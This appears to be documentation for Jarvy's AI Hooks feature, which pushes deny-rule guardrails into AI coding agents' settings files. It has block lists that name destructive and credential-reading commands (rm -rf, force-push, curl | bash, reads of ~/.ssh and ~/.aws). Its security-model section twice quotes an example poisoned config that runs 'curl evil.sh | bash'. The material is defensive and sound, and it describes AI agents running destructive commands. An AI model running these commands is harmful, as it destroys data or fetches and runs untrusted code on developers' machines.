---
title: "AI Hooks - Jarvy"
description: "Distribute curated guardrails to every developer's AI coding agent — Claude Code, Cursor, Codex, Windsurf, Cline, and Continue — from a single jarvy.toml block."
---

# AI Hooks

Distribute guardrails to every developer's AI coding agent from a single `jarvy.toml` block. Block destructive operations like `rm -rf` and `git push --force`. Block secret-bearing commits, env-file reads, and known-malicious package installs. Ship a tamper-evident audit log for SOC2 / HIPAA evidence.

Jarvy writes each guardrail to the **native settings file** of every agent you target:

| Agent | Path | Format |
|---|---|---|
| Claude Code | `~/.claude/settings.json` | JSON, `PreToolUse` hook |
| Cursor | `~/.cursor/hooks.json` | JSON, exit-code-2 deny |
| Codex CLI | `~/.codex/hooks.json` | JSON, `commandWindows` cross-platform |
| Windsurf | `~/.codeium/windsurf/hooks.json` | JSON, `command` + `powershell` |
| Cline | `~/Documents/Cline/Rules/Hooks/` | Executable scripts (macOS / Linux only) |
| Continue | `~/.continue/permissions.yaml` | Declarative deny list |

You write one config. Jarvy translates it into each agent's hook protocol. Re-running `jarvy setup` is idempotent; existing user-authored hooks are preserved by a `_jarvy_managed` marker.

---

## Quick start

Add an `[ai_hooks]` section to your `jarvy.toml`:

```toml
[ai_hooks]
agents = ["claude-code", "cursor", "codex"]

[[ai_hooks.hook]]
use = "block-rm-rf"

[[ai_hooks.hook]]
use = "block-secrets-commit"
```

Then run setup:

```bash
jarvy setup
```

That's it. Every developer on the team who runs `jarvy setup` after pulling the config gets the same two guardrails wired into all three of their AI agents.

To check what's deployed:

```bash
jarvy ai-hooks check
```

---

## Why this matters

AI coding agents now run shell commands on your developers' machines with very little friction between "model decides to do this" and "the command actually runs." A 2025 incident saw Claude Code execute `rm -rf ~/` because the agent mis-parsed a path. Cursor has shipped patches for sandbox-bypass bugs in pre-tool hook handling. The pattern is the same across vendors: the *only* deterministic line of defense is a hook that runs before the tool call and refuses the dangerous shape.

The problem: every agent has a different hook protocol, a different config path, and a different decision contract. Hand-rolling guardrails per developer, per agent, per machine doesn't scale.

Jarvy normalizes all of that. You pick from a curated library of audited hooks, declare which agents to target, and Jarvy emits the right JSON / YAML / executable script for each.

---

## Configuration

The full `[ai_hooks]` schema:

```toml
[ai_hooks]
# Which agents to provision. Empty = no-op.
agents = ["claude-code", "cursor", "codex", "windsurf", "cline", "continue"]

# Where to write hook configs:
#   "user"    → developer's home directory (default)
#   "project" → this repo's .claude/, .cursor/, etc. (commit to git)
scope = "user"

# Refuse raw `command = "..."` entries unless this is true.
# Library hooks (`use = "..."`) are always allowed.
allow_custom_commands = false

# Hook entries — repeat as many [[ai_hooks.hook]] blocks as you need.
[[ai_hooks.hook]]
use = "block-rm-rf"

[[ai_hooks.hook]]
use = "block-force-push"
# Optional: narrow to specific agents (must be a subset of the top-level list)
agents = ["claude-code", "cursor"]
```

### Hook entry fields

| Field | Type | Required | Notes |
|---|---|---|---|
| `use` | string | one of `use` / `command` | Library hook name (see below) |
| `command` | string | one of `use` / `command` | Raw shell — refused unless `allow_custom_commands = true` |
| `name` | string | optional | Override the entry's identifier (defaults to library name) |
| `event` | string | optional | Hook event override; defaults to library hook's event |
| `matcher` | string | optional | Tool-name filter (e.g. `"Bash"`, `"Edit"`); defaults to library hook's matcher |
| `command_windows` | string | optional | PowerShell variant; auto-translated from `command` if absent |
| `timeout_ms` | integer | optional | Per-hook timeout in milliseconds; default 5000 |
| `agents` | array | optional | Narrow this entry to a subset of the top-level `agents` list |

### Events

Jarvy normalizes events across agents. Each library hook fires on one of:

| Event | Fires when... |
|---|---|
| `pre_tool_use` | Before any tool call executes (most common) |
| `post_tool_use` | After a tool call returns |
| `pre_shell_execution` | Before a shell / Bash command specifically |
| `user_prompt_submit` | When the user submits a prompt |
| `session_start` | At session start |
| `stop` | When the agent stops |
| `pre_compact` | Before context compaction (Claude Code, Codex only) |

If a hook targets an event an agent doesn't support, `jarvy ai-hooks apply` reports `UnsupportedEvent` and skips that agent for that entry. Other agents in the list still get provisioned.

---

## The built-in library

Run `jarvy ai-hooks list --library` to see all curated hooks. As of this writing the library ships 16 hooks across five categories:

### Safety — block destructive operations

| Hook | Blocks |
|---|---|
| `block-rm-rf` | `rm -rf`, `rm -fr`, `sudo rm -rf` |
| `block-git-reset-hard` | `git reset --hard` (silent loss of uncommitted work) |
| `block-force-push` | `git push --force` / `-f` |
| `block-protected-branch-commit` | Direct `git push` to `main` / `master` / `production` / `release` |
| `block-kubectl-delete` | `kubectl delete namespace/deployment/cluster/all` |
| `block-docker-prune` | `docker system/volume/image/builder prune` |
| `block-drop-table` | `DROP TABLE`, `TRUNCATE`, unscoped `DELETE FROM` in shell SQL |
| `block-prod-db-write` | `psql`/`mysql`/`mongo` against `prod`, `production`, or RDS hostnames |

### Security — block secret leaks and untrusted execution

| Hook | Blocks |
|---|---|
| `block-secrets-commit` | `git commit` when staged diff contains AWS / GitHub / OpenAI / generic API keys |
| `block-edit-env-files` | Edits to `.env*`, `*.pem`, `*.key`, `credentials*`, `secrets*`, `kubeconfig*` |
| `block-read-secret-files` | Reads from `~/.ssh/`, `~/.aws/`, `~/.kube/`, `~/.gnupg/`, `*.env` |
| `block-cat-env-files` | `cat .env`, `printenv`, bare `env` |
| `block-curl-bash-pipe` | `curl ... \| bash`, `wget ... \| sh` |
| `block-malware-install` | `npm install` / `pip install` / `cargo install` of names in a static malware deny list |

### Compliance — audit evidence

| Hook | Does |
|---|---|
| `audit-log` | Appends every tool call to `~/.jarvy/logs/ai-hooks-audit.jsonl` as one tamper-evident JSON line per call (SOC2 / HIPAA evidence trail) |

### Policy — enforce conventions

| Hook | Does |
|---|---|
| `commit-message-format-guard` | Blocks `git commit -m` without a Conventional Commits prefix (`feat:`, `fix:`, `chore:`, ...) |

### Mapping to specific agents

Most library hooks map cleanly onto each agent's native protocol. A few edge cases:

- **Continue.dev** has no executable hook system, only a declarative `exclude:` glob list. Jarvy translates library hooks onto Continue's globs where the intent fits (e.g. `block-rm-rf` → `exclude: ["Bash(rm -rf*)"]`) and skips hooks that can't be expressed as a static glob, surfacing a warning.
- **Cline** is macOS / Linux only. On Windows, Cline entries are skipped with a warning; other agents continue.
- **Windsurf** does not support `pre_compact`. Entries targeting that event return `UnsupportedEvent` for the Windsurf provisioner only.

---

## CLI

```bash
jarvy ai-hooks list                  # Show what's configured in jarvy.toml
jarvy ai-hooks list --library        # Show every built-in library hook
jarvy ai-hooks apply                 # Re-apply hook configs to every targeted agent
jarvy ai-hooks apply --scope user    # Override scope for this run
jarvy ai-hooks check                 # Diff desired vs. on-disk state (exit 1 if drift)
jarvy ai-hooks remove                # Strip jarvy-managed entries from every agent
jarvy ai-hooks test <name>           # Inspect a library hook (event, matcher, scripts)
```

Examples:

```bash
# Audit what would be applied without writing anything
$ jarvy ai-hooks list
AI hooks configuration (./jarvy.toml):
  agents: [ClaudeCode, Cursor]
  scope:  User
  allow_custom_commands: false
  hooks:
    - block-rm-rf (library)
    - block-secrets-commit (library)

# Apply
$ jarvy ai-hooks apply
Applied 2 hook(s) across 2 agent(s).
  claude-code   /Users/zac/.claude/settings.json (2 applied)
  cursor        /Users/zac/.cursor/hooks.json (2 applied)

# Detect drift after a teammate edited their settings file directly
$ jarvy ai-hooks check
  claude-code   /Users/zac/.claude/settings.json OK
  cursor        /Users/zac/.cursor/hooks.json DRIFT
      missing: block-rm-rf

# Inspect a library hook before adopting it
$ jarvy ai-hooks test block-rm-rf
Library hook: block-rm-rf
  Event:    pre_tool_use
  Matcher:  "Bash"
  Timeout:  5000ms

--- bash ---
#!/usr/bin/env bash
set -u
payload="$(cat)"
cmd="$(printf '%s' "$payload" | sed -n ...)"
if printf '%s' "$cmd" | grep -Eq '...'; then
  echo "jarvy: refusing rm -rf via AI agent" >&2
  exit 2
fi
exit 0
```

---

## Setup integration

`jarvy setup` provisions AI hooks automatically as part of the standard run, after package installs and Git config, before the drift snapshot. The phase output looks like:

```
=== AI Hooks ===
  Applied 5 hook(s) across 3 agent(s)
    claude-code   /Users/zac/.claude/settings.json
    cursor        /Users/zac/.cursor/hooks.json
    codex         /Users/zac/.codex/hooks.json
```

If you want to skip the AI hook phase for a particular run (e.g. testing a config change), omit the `[ai_hooks]` section or set `agents = []`.

---

## Idempotency and the `_jarvy_managed` marker

Every hook Jarvy writes carries a `_jarvy_managed` field with the hook's name. This marker is what makes re-runs safe:

- **`apply`** removes any prior `_jarvy_managed` entry with the same name, then re-inserts. User-authored hooks (which don't have the marker) are untouched.
- **`remove`** sweeps every `_jarvy_managed` entry but preserves everything else.
- **`check`** uses the marker to count what Jarvy is managing vs. what came from elsewhere.

Example: if a developer hand-adds a `PreToolUse` hook to format their code on save, and a team config later adds `block-rm-rf` via Jarvy, both coexist. Removing the team's hook does not touch the personal one.

---

## Cross-platform behavior

Each library hook ships with **both a Bash and a PowerShell variant**. Jarvy emits whichever the target agent prefers for the current OS:

- **Claude Code, Cursor**: ship the Bash script directly on Unix; on Windows wrap the PowerShell variant in a `powershell -NoProfile -Command "..."` shim.
- **Codex CLI, Windsurf**: ship both variants in the same JSON entry under `commandWindows` (Codex) / `powershell` (Windsurf). The agent picks the right one at runtime — no shim needed.
- **Cline**: Unix only; Windows is reported as unsupported.
- **Continue**: declarative globs — platform-independent.

For custom (`command = "..."`) entries that don't ship a `command_windows` field, Jarvy attempts a narrow Bash → PowerShell translation. If translation fails, Jarvy emits a stub that no-ops on Windows and warns at `apply` time. **For custom hooks, ship an explicit `command_windows` field.**

---

## Security model

### Library hooks are trusted

The hook scripts in `block-rm-rf`, `audit-log`, and the other library entries are vetted Jarvy source code. They ship with the binary and are reviewed in the Jarvy repo. Library entries pass the audit gate without any opt-in.

### Custom commands are gated

A raw `command = "..."` entry runs arbitrary shell with the developer's privileges every time the agent makes a tool call. Jarvy refuses these by default. To enable them, set `allow_custom_commands = true` at the top of the `[ai_hooks]` block.

Team configs (e.g. one pulled from a shared remote URL) **cannot enable custom commands**. The `ConfigOrigin` tag set by `jarvy setup --from <url>` is honored at resolve time regardless of `allow_custom_commands`: a remote config asking to ship `command = "curl evil.sh | bash"` is refused outright, with a stderr warning and an `ai_hook.custom_refused_summary` event whose `remote_count` increments. The CLI flag (a local override) is the only way to enable custom commands. This is the documented "remote configs can narrow but not broaden policy" boundary.

### Refused hooks are logged

When a custom hook is refused, Jarvy emits an `ai_hook.custom_refused_summary` telemetry event with the count (no hook names or command bodies — refusals are configured behavior, not an incident). `jarvy ai-hooks list` displays the refused-list at the bottom of its report.

### Trust boundary on team configs (enforced, not just documented)

A `jarvy.toml` fetched from a remote source via `jarvy setup --from <url>` is tagged with `ConfigOrigin::Remote` at load time. The runner refuses every raw `command` entry from that config regardless of the `allow_custom_commands` flag — even if a poisoned team config tries to flip the flag and ship `command = "curl evil.sh | bash"`, the runner skips it, emits a warning, and bumps `ai_hook.custom_refused_summary.remote_count`. Library hooks (`use = "block-rm-rf"`) still apply because their bodies are vetted Jarvy source. To run custom commands from a team config, the developer must run `jarvy setup` against a locally-trusted copy.

### Settings-file integrity (`_jarvy_managed` + `_jarvy_sha256`)

Every entry Jarvy writes carries two marker fields: `_jarvy_managed` with the hook's name, and `_jarvy_sha256` with a SHA-256 of the entry's load-bearing fields (name, event, matcher, bash command, windows command, timeout). Re-running `apply` replaces entries by name (so library updates land); the hash is recorded so future tooling can refuse to delete on impersonation. The current `remove` strips every marker entry — including legacy entries from before the hash field shipped — because the operator's intent at remove time is "wipe everything Jarvy has ever owned here."

### Windows PowerShell shim uses EncodedCommand

The Claude Code and Cursor provisioners both wrap their PowerShell variant in `powershell -NoProfile -EncodedCommand <base64-utf16le>`. EncodedCommand sidesteps every shell-quoting concern because cmd.exe never sees any of the script's metacharacters. The previous shim used `\"` escaping which PowerShell does not honor (it reads `\` + string-terminating `"`), truncating the `-Command` argument and silently failing every script that referenced `"command":"..."`. The fix landed alongside the trust-boundary enforcement.

### Settings-path symlink refusal

Before writing to any agent's settings file, Jarvy calls `symlink_metadata` and refuses if the target is a symlink. `rename(2)` follows symlinks on the destination on Linux / macOS, so an attacker who can plant a symlink at `~/.claude/settings.json` could redirect the write at arbitrary files inside `$HOME` — `block-rm-rf` would clobber `~/.ssh/authorized_keys` instead of the settings file. The refusal produces an `AiHookError::SettingsPathIsSymlink` with a clean error message; users see it as a per-agent failure (the other agents still apply).

---

## Logging and telemetry

There are two distinct sources of signal here, and it's worth being explicit about which is which:

1. **Provisioning** — what Jarvy writes to disk and when. Jarvy controls this end-to-end.
2. **Hook execution** — what happens when an agent actually fires a hook. **Jarvy does not run these.** They execute inside Claude Code / Cursor / Codex / Windsurf / Cline, on the developer's machine, in the agent's own process.

That second category is where most people are surprised. If you want a record of "the agent tried to `rm -rf` and was blocked," that record has to come from either (a) the agent's own logs or (b) a hook you ship that writes its own log line. Jarvy can't observe agent-internal tool calls.

The good news: closing the gap takes one line in `jarvy.toml` (`use = "audit-log"`).

### Provisioning logs

Whenever Jarvy applies, checks, or removes hooks, it writes a structured `tracing` event to `~/.jarvy/logs/jarvy.log` — the same log file every other Jarvy subsystem uses. Configure verbosity via the standard `[logging]` block (see [logging guide](logging.md)).

Useful log events emitted by the AI hooks subsystem:

| Event | When it fires | Useful fields |
|---|---|---|
| `ai_hook.phase_started` | Top of the phase (setup or `jarvy ai-hooks apply`) | `agents`, `hooks_count`, `scope`, `dry_run` |
| `ai_hook.phase_completed` | Phase ended (success OR failure) | `applied`, `agents_touched`, `refused_local`, `refused_remote`, `failures`, `duration_ms` |
| `ai_hook.agent_applied` | A single agent's provisioning succeeded | `agent` (slug), `applied`, `warnings`, `settings_path` (redacted) |
| `ai_hook.agent_failed` | A single agent failed but the phase continued | `agent`, `error_type` (stable `AiHookError::kind()` tag — no user-controlled strings) |
| `ai_hook.provisioned` | One Jarvy-managed entry landed on disk | `agent`, `hook_name`, `library_source` (or `custom`) |
| `ai_hook.custom_refused_summary` | Roll-up of refusals at end of phase | `local_count`, `remote_count` |
| `ai_hook.check_completed` | `jarvy ai-hooks check` finished | `agents_checked`, `drifted_agents` |
| `ai_hook.windows_auto_translated` | A custom hook fell back to the Windows stub because no `command_windows` was supplied | `agent`, `hook_name` |

The error message itself is **not** emitted to the structured field — only the stable `error_type` tag. User-controlled hook names and reasons stay out of OTLP payloads so they can't carry secrets.

Inspect with the standard CLI:

```bash
jarvy logs view --lines 100 | grep ai_hook
jarvy logs view --level info | grep agent_applied
```

### Telemetry (OTLP)

When telemetry is enabled (`jarvy telemetry enable`), the same events are exported as OTLP log records to your configured endpoint. The event names and field shapes match the local log entries above, so the same query works across both surfaces.

Telemetry is **opt-out by default** and follows Jarvy's standard trust boundary: a remote `jarvy.toml` can narrow what's emitted but can't broaden it. See [telemetry](telemetry.md) for the full opt-out / disable model and the endpoint configuration.

There is no `ai_hook.hook_executed` event in Jarvy telemetry, and there can't be — Jarvy doesn't run the hooks. If you want OTLP visibility into actual hook fires, see the next section.

### Hook execution evidence

To capture what actually happens at runtime — every tool call the agent makes, whether it was allowed or blocked — add the `audit-log` library hook:

```toml
[ai_hooks]
agents = ["claude-code", "cursor", "codex", "windsurf"]

[[ai_hooks.hook]]
use = "audit-log"
```

This wires a hook into every supported agent that appends one JSON line per tool call to `~/.jarvy/logs/ai-hooks-audit.jsonl`:

```jsonl
{"ts":"2026-06-13T18:42:11Z","event":"ai_hooks_audit","payload":{"tool_name":"Bash","tool_input":{"command":"git status"}}}
{"ts":"2026-06-13T18:42:14Z","event":"ai_hooks_audit","payload":{"tool_name":"Bash","tool_input":{"command":"rm -rf /tmp/test"}}}
{"ts":"2026-06-13T18:42:14Z","event":"ai_hooks_audit","payload":{"tool_name":"Read","tool_input":{"file_path":"./src/main.rs"}}}
```

Properties:

- **One line per tool call**, across every supported agent
- **Append-only**; rotation is handled by `jarvy logs clean`
- **Independent of telemetry consent** — the file lives on the developer's machine and is never exported automatically; you control what (if anything) ships off-box
- **SOC2 / HIPAA / PCI evidence trail** out of the box — auditors get a single source of truth across heterogeneous agents

Override the destination per-machine with `JARVY_AUDIT_LOG_DIR=/some/other/dir`. To ship the audit log off-box, point your existing log shipper (Vector, Filebeat, Promtail, Splunk Forwarder, ...) at `~/.jarvy/logs/ai-hooks-audit.jsonl`. The file is plain JSONL with the same `ai_hooks_audit` event name regardless of agent, so queries don't have to branch on agent identity.

### Surfacing blocked actions in your own audit log

If you want a clean record of *just* the deny events (not every tool call), write a custom hook that mirrors the library script and emits a different event name when it blocks. The skeleton:

```bash
#!/usr/bin/env bash
set -u
payload="$(cat)"
cmd="$(printf '%s' "$payload" | sed -n 's/.*"command"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)"
log_dir="${JARVY_AUDIT_LOG_DIR:-$HOME/.jarvy/logs}"
mkdir -p "$log_dir" 2>/dev/null || true

if printf '%s' "$cmd" | grep -Eq '<your-deny-regex>'; then
  ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  printf '{"ts":"%s","event":"ai_hooks_denied","hook":"my-policy","payload":%s}\n' "$ts" "$payload" \
    >> "$log_dir/ai-hooks-denied.jsonl"
  echo "team policy: action refused" >&2
  exit 2
fi
exit 0
```

Combining `audit-log` (every call) with a deny-specific hook (only blocks) gives you a low-noise security signal alongside a complete activity trail.

### Per-agent native logs

For deep debugging of an individual hook execution, the agent's own logs are usually more detailed than anything Jarvy could capture:

| Agent | Where to look |
|---|---|
| Claude Code | `~/.claude/projects/<project>/transcript.jsonl` — full `hook_input` / `hook_output` blocks. Run `claude --debug` to mirror to stderr. |
| Cursor | Settings → AI → "Show hook output" or `cursor --log-level=debug`. Hook stderr appears in the agent's reasoning view. |
| Codex CLI | `~/.codex/sessions/<session>/log.jsonl`. Run with `codex --verbose` for live stdout. |
| Windsurf | Cascade → Settings → "Show hook output". Hook outputs are persisted in the workspace's `.windsurf/logs/` if logging is enabled. |
| Cline | VS Code → Output panel → "Cline" channel; transcripts in `~/Documents/Cline/Tasks/<task>/`. |

Use these when you need to know *why* a specific hook fired or didn't on a specific tool call. Use `~/.jarvy/logs/ai-hooks-audit.jsonl` when you need the cross-agent activity record.

---

## Writing custom hooks

The 16 library hooks cover the common cases. When you need something specific — block a tool only your team uses, inject context from an internal API, enforce a custom branch-naming convention — you write a custom hook.

A custom hook is just a shell script the agent runs at one of the [supported events](#events). Jarvy ships your script verbatim into the target agent's settings file; the agent executes it and reads stdout / stderr / exit code to decide whether to allow the tool call.

### The basic shape

Every hook receives a JSON payload on stdin describing the tool call about to happen. The hook decides allow / deny and signals the decision via **exit code 2 to block, exit code 0 to allow**. (This is the cross-agent lowest common denominator — every agent treats exit code 2 as a deny.)

A minimal "block any command containing `dangerous-thing`" hook:

```bash
#!/usr/bin/env bash
set -u
payload="$(cat)"
cmd="$(printf '%s' "$payload" | sed -n 's/.*"command"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)"
if printf '%s' "$cmd" | grep -q 'dangerous-thing'; then
  echo "jarvy: refusing dangerous-thing" >&2
  exit 2
fi
exit 0
```

Wire it into `jarvy.toml`:

```toml
[ai_hooks]
agents = ["claude-code", "cursor"]
allow_custom_commands = true            # <-- required for custom commands

[[ai_hooks.hook]]
name = "block-dangerous-thing"
event = "pre_tool_use"
matcher = "Bash"
command = '''
#!/usr/bin/env bash
set -u
payload="$(cat)"
cmd="$(printf '%s' "$payload" | sed -n 's/.*"command"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)"
if printf '%s' "$cmd" | grep -q 'dangerous-thing'; then
  echo "jarvy: refusing dangerous-thing" >&2
  exit 2
fi
exit 0
'''
command_windows = '''
$payload = [Console]::In.ReadToEnd()
$cmd = ''
if ($payload -match '"command"\s*:\s*"([^"]*)"') { $cmd = $Matches[1] }
if ($cmd -match 'dangerous-thing') {
  [Console]::Error.WriteLine('jarvy: refusing dangerous-thing')
  exit 2
}
exit 0
'''
timeout_ms = 5000
```

Run `jarvy ai-hooks apply` and the hook lands in `~/.claude/settings.json` and `~/.cursor/hooks.json`.

### Required `allow_custom_commands = true`

Raw `command = "..."` entries run arbitrary shell every time the agent makes a tool call. Jarvy refuses them by default. To use any custom hook, set `allow_custom_commands = true` at the top of your `[ai_hooks]` block.

Team configs (pulled from a shared remote source) should leave this `false` so a hostile or sloppy upstream config can't slip in arbitrary shell. Individual developers and project-local configs can opt in. See [Security model](#security-model) for why.

### The stdin payload differs per agent

Every agent ships a different JSON shape on stdin. The keys you can rely on across all of them are the **tool name** and the **tool input** — but the field names diverge.

| Agent | Tool name field | Tool input field | Other useful fields |
|---|---|---|---|
| Claude Code | `tool_name` | `tool_input.command` (for Bash), `tool_input.file_path` (for Edit) | `session_id`, `cwd`, `transcript_path` |
| Cursor | inferred from event | `command` (top-level for `beforeShellExecution`), `file_path` for read/edit | `conversation_id`, `workspace_roots` |
| Codex CLI | `tool_name` | `tool_input.command` | `session_id`, `cwd` |
| Windsurf | inferred from event | `command_line` (for `pre_run_command`), `mcp_tool_arguments` (for MCP) | `mcp_server_name`, `mcp_tool_name` |
| Cline | `toolName` | `toolParameters` | `cwd`, `taskId` |

For maximum portability, parse with a regex that matches several variants:

```bash
cmd="$(printf '%s' "$payload" \
  | sed -n -e 's/.*"command"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' \
           -e 's/.*"command_line"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' \
  | head -1)"
```

This is exactly what the library scripts do. Look at any `BLOCK_*_BASH` constant in [`src/ai_hooks/library.rs`](https://github.com/bearbinary/jarvy/blob/main/src/ai_hooks/library.rs) for working examples across event types.

### Exit codes and decision protocol

| Exit code | Meaning | Cross-agent? |
|---|---|---|
| `0` | Allow the tool call | yes |
| `2` | Block the tool call (deny) | yes |
| other non-zero | Treated as an error; behavior varies | depends on agent |

Stdout is the **user-visible reason** the hook blocked. Stderr is the **agent-visible reason** — Claude Code and Cursor surface it back to the model so the AI knows why its action was refused (and can try a different approach). Always emit a stderr message when you exit 2; without it, the agent retries blindly.

Some agents (Cursor, Codex, Claude Code) also accept a structured JSON decision on stdout:

```json
{ "permission": "deny", "reason": "rm -rf blocked by team policy" }
```

But the JSON shape differs across agents, and exit code 2 works everywhere. **Prefer exit code 2 unless you specifically need fields like `additional_context` or `permission: "ask"`.**

### Matchers

The `matcher` field narrows the hook to a subset of tool calls. Each agent uses different tool names:

| Tool intent | Claude Code | Cursor | Codex | Windsurf | Cline |
|---|---|---|---|---|---|
| Shell command | `Bash` | `Shell` (via `beforeShellExecution`) | `Bash` | (use `pre_run_command` event) | `execute_command` |
| File read | `Read` | (via `beforeReadFile`) | `Read` | (use `pre_read_code` event) | `read_file` |
| File edit | `Edit`, `Write`, `MultiEdit` | (via `afterFileEdit`) | `Edit` | (use `pre_write_code` event) | `write_to_file` |
| MCP call | `mcp__server__tool` | `MCP:server:tool` | (via MCP-specific events) | (use `pre_mcp_tool_use` event) | `use_mcp_tool` |

Cursor and Windsurf encode tool intent in the **event name** rather than a matcher field, so for those agents the matcher is often unused. Jarvy's library hooks use Claude Code's matcher names (`Bash`, `Edit`, `Read`) since those map cleanly onto the most common other agents; the provisioners translate as needed.

### Common patterns

#### Block a path-based pattern

```bash
path="$(printf '%s' "$payload" | sed -n 's/.*"file_path"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)"
case "$path" in
  */migrations/*) echo "jarvy: migrations must be PR-reviewed" >&2; exit 2 ;;
esac
exit 0
```

#### Inject context (PreToolUse passthrough)

```bash
# Emit additional context on stdout for the agent to see.
echo "Reminder: this codebase uses tabs, not spaces."
exit 0
```

Note: only some agents respect stdout context injection on PreToolUse. Use `UserPromptSubmit` for reliable context injection.

#### Log to an audit file

```bash
log_dir="${MY_AUDIT_DIR:-$HOME/.team-audit}"
mkdir -p "$log_dir"
ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
printf '{"ts":"%s","payload":%s}\n' "$ts" "$payload" >> "$log_dir/agent.jsonl"
exit 0
```

(See the built-in `audit-log` hook for a production-ready version.)

#### Call an internal API to validate

```bash
result="$(curl -s --max-time 3 https://policy.internal/check -d "@-" <<<"$payload")"
if [ "$result" = "deny" ]; then
  echo "jarvy: policy server refused this action" >&2
  exit 2
fi
exit 0
```

Keep network calls fast and bounded — hook timeouts are 5 seconds by default. Set `timeout_ms` higher if you need more.

### Debugging hook executions

There are six failure modes people hit when a hook isn't doing what they expect. The diagnostic flow is mostly the same: **prove the hook is installed, capture what the agent actually sent it, replay that payload locally with tracing, then narrow.**

The single biggest source of confusion is that **Jarvy doesn't run hooks** — the agent does. So when something goes wrong, Jarvy can tell you what got written to disk (`jarvy ai-hooks check`), and the agent can tell you what happened at runtime (its transcript / log file). You need both halves.

#### Scenario 1: the hook didn't fire when you expected it to

The agent ran `rm -rf` and nothing stopped it. Walk this checklist top-to-bottom:

```bash
# 1. Is the hook actually on disk?
jarvy ai-hooks check
#    If output says "DRIFT" / "missing", run `jarvy ai-hooks apply` first.

# 2. Did Jarvy write to the path you think it did?
jarvy logs view --lines 50 | grep ai_hooks.applied

# 3. Read the actual settings file the agent uses.
cat ~/.claude/settings.json | jq '.hooks.PreToolUse'
cat ~/.cursor/hooks.json     | jq '.hooks.preToolUse'
cat ~/.codex/hooks.json      | jq '.hooks'
```

If the entry is there but the agent still didn't fire it, three things to check:

| Cause | How to confirm | Fix |
|---|---|---|
| Matcher mismatched the tool name | Look at the agent's transcript for the tool call — what `tool_name` did it actually use? | Adjust `matcher` to match the agent's real tool name (see table in [Matchers](#matchers)) |
| Wrong event | Same — check whether the agent fired `PreToolUse` or something else (Cursor splits shell into `beforeShellExecution`; Windsurf splits MCP into `pre_mcp_tool_use`) | Use the right `event` for the agent |
| Agent has a known PreToolUse gap | Codex CLI doesn't reliably fire PreToolUse for `apply_patch` or many MCP calls; Cursor's `cursor-agent` CLI only fires `beforeShellExecution` | See [Limitations](#limitations) — for Codex, govern at the MCP boundary instead; for Cursor CLI, use `beforeShellExecution` |

#### Scenario 2: the hook fired but blocked the wrong thing (false positive)

Your hook is too aggressive. You need to see the exact stdin payload that triggered the block so you can refine the regex.

```bash
# Capture the next payload your hook receives by replacing the command
# temporarily with a passthrough that copies stdin to a file:
cp ~/.claude/settings.json ~/.claude/settings.json.bak
# Edit the hook's `command` field to:
#   tee /tmp/last-payload.json | bash -c '$ORIGINAL_SCRIPT'
# Re-trigger the agent action, then:
cat /tmp/last-payload.json | jq .
```

A faster pattern: add a one-line debug trap to the top of the hook script itself (see `debug-hook` wrapper below) — no settings-file surgery needed.

#### Scenario 3: the hook fired but allowed something it shouldn't have (false negative)

Same approach as scenario 2, but you're looking for *which* payload slipped through. The simplest diagnostic is to make the hook log every invocation:

```bash
#!/usr/bin/env bash
set -u
payload="$(cat)"
ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
printf '{"ts":"%s","payload":%s}\n' "$ts" "$payload" >> ~/.jarvy/logs/hook-debug.jsonl

# ... your original deny logic ...
```

Then trigger both an action that *should* block and one that *shouldn't*, and compare the two payload shapes. Most false-negatives come from a regex that didn't account for an extra prefix (`sudo `, `env FOO=bar `, leading whitespace) or a different field name on a different agent.

#### Scenario 4: the hook timed out

Some agents report timeouts to their transcripts (Claude Code logs `hook_timeout`); others silently fail-open (Cursor with `failClosed: false`).

```bash
# Bump the timeout in jarvy.toml — default is 5000ms.
[[ai_hooks.hook]]
use = "policy-server-gate"
timeout_ms = 10000

# Re-apply.
jarvy ai-hooks apply

# Confirm the new timeout landed:
cat ~/.claude/settings.json | jq '.hooks.PreToolUse[] | select(._jarvy_managed=="policy-server-gate")'
```

If the hook genuinely needs more than a few seconds, move the slow work out of the hot path: cache the policy decision, batch lookups, or replace a synchronous network call with a local sidecar.

#### Scenario 5: the hook errored (non-2 non-zero exit)

The script crashed. Each agent handles this differently — Claude Code typically allows the call but logs `hook.failed`; Cursor's default is fail-open (`failClosed: false`).

Find the underlying error by re-running the script in a TTY:

```bash
# Pull out the script body Jarvy installed.
jq -r '.hooks.PreToolUse[] | select(._jarvy_managed=="my-hook") | .hooks[0].command' \
  ~/.claude/settings.json > /tmp/my-hook.sh
chmod +x /tmp/my-hook.sh

# Feed it a realistic payload and watch stderr.
echo '{"tool_name":"Bash","tool_input":{"command":"rm -rf /tmp/test"}}' \
  | bash -x /tmp/my-hook.sh
```

`bash -x` traces every line, which makes "command not found" / "sed: bad option" failures obvious immediately.

#### Scenario 6: works locally, breaks inside the agent

This almost always means the stdin payload shape differs from what you assumed. **Each agent sends different JSON.** A hook tested against Claude Code's `{"tool_input":{"command":"..."}}` will silently no-op on Windsurf, which sends `{"command_line":"..."}`.

Quick fix: write the parsing logic to accept multiple shapes:

```bash
cmd="$(printf '%s' "$payload" \
  | sed -n \
      -e 's/.*"command"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' \
      -e 's/.*"command_line"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' \
  | head -1)"
```

This is what the library hooks all do. See any `BLOCK_*_BASH` constant in [`src/ai_hooks/library.rs`](https://github.com/bearbinary/jarvy/blob/main/src/ai_hooks/library.rs).

---

#### The "debug-hook" wrapper pattern

When iterating, replace your hook's `command` field with this wrapper. It logs every invocation (payload, decision, duration) and still runs your real logic:

```bash
#!/usr/bin/env bash
set -u
payload="$(cat)"
log="${JARVY_AUDIT_LOG_DIR:-$HOME/.jarvy/logs}/hook-debug.jsonl"
mkdir -p "$(dirname "$log")" 2>/dev/null || true
started="$(date -u +%s%3N)"

# ---- your real hook logic goes here -----------------------------------
decision=0
if printf '%s' "$payload" | grep -q 'dangerous-thing'; then
  echo "jarvy: refusing dangerous-thing" >&2
  decision=2
fi
# -----------------------------------------------------------------------

